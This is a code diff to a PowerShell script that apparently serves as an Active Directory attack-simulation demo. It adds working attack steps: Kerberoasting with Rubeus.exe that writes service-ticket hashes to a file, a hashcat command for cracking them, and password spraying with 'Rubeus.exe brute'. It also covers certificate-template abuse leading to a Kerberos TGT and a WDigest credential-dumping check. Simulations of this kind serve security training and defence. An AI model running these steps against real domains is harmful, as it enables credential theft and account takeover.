@@ -103,6 +103,10 @@ $InitialStart = "Start"
 $PrivledgeAccount = $no
 
 
+$RUBEUS = "Rubeus.exe"
+
+
+
 $stage00 = "COMPROMISED User Account"
 $stage05 = "BRUCE FORCE or PW SPRAY"
 $stage10 = "RECONNAISSANCE"
@@ -157,6 +161,58 @@ Write-Log -Message "### End Function $myfunction ###"
 
 
 #region AS2GO Functions
+
+
+function Start-KerberoastingAttack {
+
+################################################################################
+######                                                                     #####
+######                Kerberoasting Attack                                 #####
+######                                                                     ##### 
+######     technique used by attackers, which allows them to request       #####
+######     a service ticket for any service with a registered SPN.         #####
+######                                                                     #####
+################################################################################
+
+
+$myfunction = Get-FunctionName
+Write-Log -Message "### Start Function $myfunction ###"
+#####
+
+
+$myDomain = $env:USERDNSDOMAIN
+$hashes   = "$myDomain.hashes.txt"
+
+#write-host "AS2Go uses Rubeus.exe to request a service ticket for any service with a registered SPN`n"
+Write-Host "NEXT STEP: " -NoNewline
+Write-Host ".\$RUBEUS kerberoast /domain:$myDomain /outfile:.\$hashes" -ForegroundColor $global:FGCCommand
+
+$question = "`nDo you want to run this step - Y or N? Default "
+$answer   = Get-Answer -question $question -defaultValue $No
+
+If ($answer -eq $yes)
+{   
+
+    Invoke-Command -ScriptBlock {.\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes}
+    Invoke-Item .\$hashes
+    
+    pause
+    Write-Host "`n"
+    write-host "The next step is cracking the roasted hashes. HASHCAT is good tool." -ForegroundColor Yellow
+    Write-Host "`nThe cracking mode for TGS-REP hashes is 13100, e.g.`n"
+    Write-host "hashcat.exe -a 3 -m 13100 ./$hashes -1 123  -2 eqw ?1?2?1?2?1?2?s?u" -ForegroundColor Yellow
+  
+    pause
+
+}
+
+
+#####
+Write-Log -Message "### End Function $myfunction ###"
+}
+
+
+
 
 
 function FindVulnerableCATemplates{
@@ -280,10 +336,26 @@ $NoU      = (Get-ADUser -filter * -SearchBase $MyPath).count
 $MyPW01 = Get-RandomPassword
 #second run with valid password
 $MyPW02 = Get-KeyValue -key "SP01"
+#third run with valid password
+$MyPW03 = Get-RandomPassword
+
 
 Do
 {
-$question = "`nDo you like to use this password '$MyPW02' for the second next run - Y or N? Default "
+$question = "`nDo you like to use this password '$MyPW01' for the 1st spray - Y or N? Default "
+$prompt   = Get-Answer -question $question -defaultValue $yes
+
+if ($prompt -ne $yes) 
+   {
+   $MyPW01 = Read-Host "Enter new password"
+   }
+   
+} Until ($prompt -eq $yes)
+
+
+Do
+{
+$question = "`nDo you like to use this password '$MyPW02' for the 2nd spray - Y or N? Default "
 $prompt   = Get-Answer -question $question -defaultValue $yes
 
 if ($prompt -ne $yes) 
@@ -297,22 +369,40 @@ if ($prompt -ne $yes)
 
 
 # example - First run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp       
-Write-Host "`nFirst run with password " -NoNewline; Write-host $MyPW01 -NoNewline -ForegroundColor Yellow
+Write-Host "`nSpray #1 runs with password " -NoNewline; Write-host $MyPW01 -NoNewline -ForegroundColor Yellow
 Write-Host " against "-NoNewline;Write-Host $NoU -NoNewline -ForegroundColor Yellow
 Write-Host " users from OU " -NoNewline;Write-Host $MyPath -ForegroundColor Yellow
 
 # example - Second run with password zwm1FCxXi2!3+ against 2167 users from OU OU=Demo Accounts,OU=AS2Go,DC=sandbox,DC=corp    
-Write-Host "Second run with password " -NoNewline; Write-host $MyPW02 -NoNewline -ForegroundColor Yellow
+Write-Host "Spray #2 runs with password " -NoNewline; Write-host $MyPW02 -NoNewline -ForegroundColor Yellow
 Write-Host " against "-NoNewline;Write-Host $NoU -NoNewline -ForegroundColor Yellow
 Write-Host " users from OU " -NoNewline;Write-Host $MyPath -ForegroundColor Yellow
 Write-Host ""
 pause
 
 Start-PasswordSprayAttack -Domain $MyDomain -Password $MyPW01 -SearchBase $MyPath -NoR "1 of 2"
-
-#Invoke-Command -ScriptBlock {.\Rubeus.exe brute /password:$MyPW01 /noticket}
-
 Start-PasswordSprayAttack -Domain $MyDomain -Password $MyPW02 -SearchBase $MyPath -NoR "2 of 2"
+
+$question = "`nDo you also want to run a Password Spray attack with rubues.exe - Y or N? Default "
+$prompt   = Get-Answer -question $question -defaultValue $no
+
+if ($prompt -eq $yes)
+{
+    $question = "`nDo you like to use this password '$MyPW03' for the spray with Rubeus - Y or N? Default "
+    $prompt   = Get-Answer -question $question -defaultValue $yes
+
+    if ($prompt -ne $yes) {
+      $MyPW03 = Read-Host "Enter new password"
+      }
+
+    Write-Log -Message ".\Rubeus.exe brute /password:$MyPW03 /noticket"
+    Write-Host  ".\Rubeus.exe brute /password:$MyPW03 /noticket"
+    pause
+    Invoke-Command -ScriptBlock {.\Rubeus.exe brute /password:$MyPW03 /noticket}
+}
+   
+
+
 Write-Host ""
 pause
 
@@ -2369,11 +2459,15 @@ else
 }
 
 
-# only for PosH Script testing
-If ($answer -eq $debug)
+# only for PosH Script testing Holger
+If ($DeveloperMode)
 {
 # function to test 
 #Restart-VictimMachines
+Write-host "Run directy" -ForegroundColor Red
+Prepare-BruceForceAttack
+
+
 }
 
 
@@ -2411,7 +2505,7 @@ If ($answer -eq $yes)
     Write-host "  Account restrictions are preventing this user from signing in." -ForegroundColor Yellow
     Write-HosT "  Probably helpdesk user '$helpdeskuser' is member of the 'Protected Users' Group!`n`n" -ForegroundColor Yellow
     pause
-    Stop-AS2GoDemo
+    #Stop-AS2GoDemo
     }
     
 
@@ -2625,8 +2719,16 @@ Write-Host ""
 $MyCAConfig = Invoke-Command -ScriptBlock {certutil}
 $temp       = $MyCAConfig[7].Split([char]0x0060).Split([char]0x0027).Split([char]0x0022)
 $myEntCA    = $temp[1]
-Write-Host "Found & use Enterprise Certification Authority: $myEntCA`n" -ForegroundColor $global:FGCHighLight
-pause
+
+
+$question = "`n -> Enter or confirm the Enterprise Certification Authority! Default "
+$myEntCA = Get-Answer -question $question -defaultValue $myEntCA
+
+
+
+
+#Write-Host "Found & use Enterprise Certification Authority: $myEntCA`n" -ForegroundColor $global:FGCHighLight
+#pause
 #endregion 2
 
 Clear-Host
@@ -2707,10 +2809,8 @@ else
 }
 pause
 
-}
-
 #endregion Step 3 - Requesting Certificate with Certify
-
+#region Step 4 - Converting PEM to PFX via openSSL
 
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
@@ -2744,6 +2844,8 @@ pause
 
 Get-Item $pfxFile
 
+#endregion Step 4 - Converting PEM to PFX via openSSL
+#region Step 5 - Request a Kerberos TGT
 pause
 
 Clear-Host
@@ -2781,6 +2883,12 @@ Catch
     Write-Host " "$message.CategoryInfo.Reason:" " -NoNewline
     $message.Exception
 }
+pause
+
+#endregion Step 5 - Request a Kerberos TGT
+
+
+} ##
 
 
 Clear-Host
@@ -2804,7 +2912,7 @@ $repeat   = Get-Answer -question $question -defaultValue $no
 ######                Attack Level -  Kerberoasting Attack                 #####
 ######                                                                     ##### 
 ######     technique used by attackers, which allows them to request       #####
-######     a service ticket for any service with a registered SPN.         #####
+######     a service ticket for any service with a registered SPN          #####
 ######                                                                     #####
 ################################################################################
 
@@ -2815,39 +2923,16 @@ Set-KeyValue -key "LastStage" -NewValue $stage20
 #Show-Step -step "step_007.html"
 Do 
 {
+
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
 Write-Host "                 Attack Level -  Kerberoasting Attack               "
 Write-Host ""
-Write-Host "        AS2Go uses Rubeus.exe to request a service ticket           "
+Write-Host "        AS2Go uses $RUBEUS to request a service ticket           "
 Write-Host "            for any service with a registered SPN`n"
 Write-Host "____________________________________________________________________`n" 
 
-$myDomain = $env:USERDNSDOMAIN
-$hashes   = "$myDomain.hashes.txt"
-
-#write-host "AS2Go uses Rubeus.exe to request a service ticket for any service with a registered SPN`n"
-Write-Host "NEXT STEP: " -NoNewline
-Write-Host ".\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes" -ForegroundColor $global:FGCCommand
-
-$question = "`nDo you want to run this step - Y or N? Default "
-$answer   = Get-Answer -question $question -defaultValue $No
-
-If ($answer -eq $yes)
-{   
-
-    Invoke-Command -ScriptBlock {.\Rubeus.exe kerberoast /domain:$myDomain /outfile:.\$hashes}
-    Invoke-Item .\$hashes
-    
-    pause
-    Write-Host "`n"
-    write-host "The next step is cracking the roasted hashes. HASHCAT is good tool." -ForegroundColor Yellow
-    Write-Host "`nThe cracking mode for TGS-REP hashes is 13100, e.g.`n"
-    Write-host "hashcat.exe -a 3 -m 13100 ./$hashes -1 123  -2 eqw ?1?2?1?2?1?2?s?u" -ForegroundColor Yellow
-  
-    pause
-    
-}
+Start-KerberoastingAttack    
 
 Clear-Host
 
@@ -3088,7 +3173,17 @@ Stop-AS2GoDemo
 enter-pssession -ComputerName Ch01-DSP-MGMT
 
 
+try
+{
+#https://www.hackingarticles.in/credential-dumping-wdigest/
 
+$UseLogonCredential = Get-ItemPropertyValue -Name UseLogonCredential -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
+Write-Host $UseLogonCredential
+}
+catch
+{
+Write-Host Get-ItemPropertyValue : Property UseLogonCredential does not exist at path -ForegroundColor yellow
+}
 
 
 #>
